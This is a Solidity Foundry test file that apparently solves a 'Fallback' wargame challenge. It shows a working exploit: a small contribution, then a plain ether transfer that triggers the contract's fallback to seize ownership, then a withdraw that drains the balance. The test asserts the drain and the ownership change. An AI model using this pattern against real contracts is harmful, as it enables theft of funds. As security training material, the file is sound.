// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Fallback} from "../src/1.Fallback.sol";

contract FallbackHackTest is Test {
    Fallback fallbackContract;
    function setUp() public {
        fallbackContract = new Fallback();
    }

    function hack() public payable { 
        fallbackContract.contribute{value:0.00001 ether}();
        (bool s,) = address(fallbackContract).call{value:0.1 ether}("");
        if(s){
            fallbackContract.withdraw();
        }
    }
    function testHack() public {
        hack();
        assertEq(address(fallbackContract).balance, 0);
        assertEq(fallbackContract.owner(), address(this));
    }
    receive() external payable {}
}
